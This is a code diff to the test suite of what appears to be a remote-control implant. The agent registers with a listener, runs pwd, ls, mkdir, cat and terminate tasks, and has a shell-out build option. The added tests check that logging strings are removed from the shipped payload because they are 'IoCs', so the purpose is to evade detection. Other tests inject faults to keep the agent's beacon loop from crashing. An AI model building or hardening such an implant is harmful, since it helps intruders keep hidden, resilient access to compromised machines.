@@ -131,6 +131,11 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
     let art = fs.readFileSync(path.join(ROOT, 'dist', 'testmin.js'), 'utf8');
     for (const w of ['child_process', 'tasklist', 'net session'])
       assert.ok(!art.includes(w), `shellout string '${w}' in default artifact`);
+    // 003: no dev logging may survive into the shipped artifact (quiet-mode
+    // off is not enough — the strings themselves are IoCs)
+    for (const w of ['console.log', 'console.error', 'task parse error',
+                     'reply queued', 'callback error'])
+      assert.ok(!art.includes(w), `dev-log string '${w}' in default artifact`);
     r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                          '--fixed-tokens', '--allow-shellout', '--name', 'testminsh'],
                   { encoding: 'utf8' });
@@ -178,7 +183,7 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
     assert.ok(mout2.includes('[mock] listening'), 'mock2 up: ' + mout2);
 
     const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbake.js')],
-      { env: { ...process.env, MAX_CYCLES: '12' }, stdio: ['ignore', 'pipe', 'pipe'] });
+      { env: { ...process.env, LW_MAX_CYCLES: '12' }, stdio: ['ignore', 'pipe', 'pipe'] });
     let aout2 = '';
     agent.stdout.on('data', (d) => { aout2 += d; });
     agent.stderr.on('data', (d) => { aout2 += d; });
@@ -240,7 +245,7 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
     const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
       env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
              LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_DEBUG: '1',
-             MAX_CYCLES: '20' },
+             LW_MAX_CYCLES: '20' },
       stdio: ['ignore', 'pipe', 'pipe'] });
     let aout = '';
     agent.stdout.on('data', (d) => { aout += d; });
@@ -276,6 +281,67 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
     fs.rmSync(tasksFile, { force: true });
     fs.rmSync(path.join(process.cwd(), 'lwtest-dir'), { recursive: true, force: true });
     ok('task round-trip (pwd/ls/mkdir/sleep/terminate)');
+  }
+
+  // 8. fault injection (ticket 003): the agent must survive every chaos mode
+  //    without crashing (exit 0 via MAX_CYCLES) and without a fatal print
+  for (const chaos of ['reset', 'garbage', 'badkey', 'badtask']) {
+    const port = 23000 + (process.pid % 20000) + chaos.length;
+    const tf = path.join(__dirname, `.chaos-${chaos}.ndjson`);
+    fs.writeFileSync(tf, JSON.stringify({ cmd: 4 }) + '\n'); // something to corrupt
+    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tf],
+      { env: { ...process.env, LISTEN_PORT: String(port), CHAOS: chaos },
+        stdio: ['ignore', 'pipe', 'pipe'] });
+    let mout = '';
+    mock.stdout.on('data', (d) => { mout += d; });
+    mock.stderr.on('data', (d) => { mout += d; });
+    await sleep(500);
+    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
+      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
+             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_MAX_CYCLES: '4' },
+      stdio: ['ignore', 'pipe', 'pipe'] });
+    let aout = '';
+    agent.stdout.on('data', (d) => { aout += d; });
+    agent.stderr.on('data', (d) => { aout += d; });
+    const dl = Date.now() + 15000;
+    while (Date.now() < dl && agent.exitCode === null) await sleep(200);
+    assert.strictEqual(agent.exitCode, 0, `chaos=${chaos}: agent crashed/hung: ${aout}\nmock: ${mout}`);
+    assert.ok(!aout.includes('fatal'), `chaos=${chaos}: fatal print: ${aout}`);
+    try { agent.kill('SIGKILL'); } catch (_) {}
+    mock.kill('SIGKILL');
+    fs.rmSync(tf, { force: true });
+    ok(`fault injection: ${chaos}`);
+  }
+
+  // 8b. fs error frame (EACCES/ENOENT) — task errors must not kill the loop
+  {
+    const port = 24000 + (process.pid % 20000);
+    const tf = path.join(__dirname, '.err.ndjson');
+    fs.writeFileSync(tf, '');
+    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tf],
+      { env: { ...process.env, LISTEN_PORT: String(port) }, stdio: ['ignore', 'pipe', 'pipe'] });
+    let mout = '';
+    mock.stdout.on('data', (d) => { mout += d; });
+    mock.stderr.on('data', (d) => { mout += d; });
+    await sleep(500);
+    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
+      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
+             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_MAX_CYCLES: '6' },
+      stdio: ['ignore', 'pipe', 'pipe'] });
+    let aout = '';
+    agent.stdout.on('data', (d) => { aout += d; });
+    agent.stderr.on('data', (d) => { aout += d; });
+    const dl = Date.now() + 10000;
+    while (Date.now() < dl && !mout.includes('[reg] NEW agent')) await sleep(200);
+    assert.ok(mout.includes('[reg] NEW agent'), 'err-frame registration: ' + mout + aout);
+    fs.writeFileSync(tf, JSON.stringify({ cmd: 24, path: '/root/definitely-not-here.bin' }) + '\n');
+    const dl2 = Date.now() + 8000;
+    while (Date.now() < dl2 && !mout.includes('cmd=286392319')) await sleep(200);
+    assert.ok(mout.includes('cmd=286392319'), 'expected ERROR frame for unreadable cat: ' + mout);
+    try { agent.kill('SIGKILL'); } catch (_) {}
+    mock.kill('SIGKILL');
+    fs.rmSync(tf, { force: true });
+    ok('fs error frame (cat unreadable path)');
   }
 
   console.log(`\n${passed} passed`);
